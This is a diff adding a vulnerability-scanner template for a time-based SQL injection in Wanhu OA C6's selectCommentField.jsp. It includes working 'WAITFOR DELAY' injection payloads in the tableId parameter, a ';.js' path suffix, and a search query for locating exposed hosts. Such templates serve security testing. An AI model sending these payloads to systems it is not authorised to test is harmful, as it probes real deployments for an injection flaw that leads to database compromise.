@@ -1,0 +1,26 @@
+id: wanhuOA-selectCommentField-sqli
+
+info:
+  name: wanhuOA-C6-selectCommentField-sqli
+  author: CyberCG
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+  metadata:
+    fofa-query: body="defaultroot"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;WAITFOR%20DELAY%20'0:0:3'--%20-"
+      - "{{BaseURL}}/defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;WAITFOR%20DELAY%20'0:0:6'--%20-"
+      - "{{BaseURL}}/defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;WAITFOR%20DELAY%20'0:0:9'--%20-"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
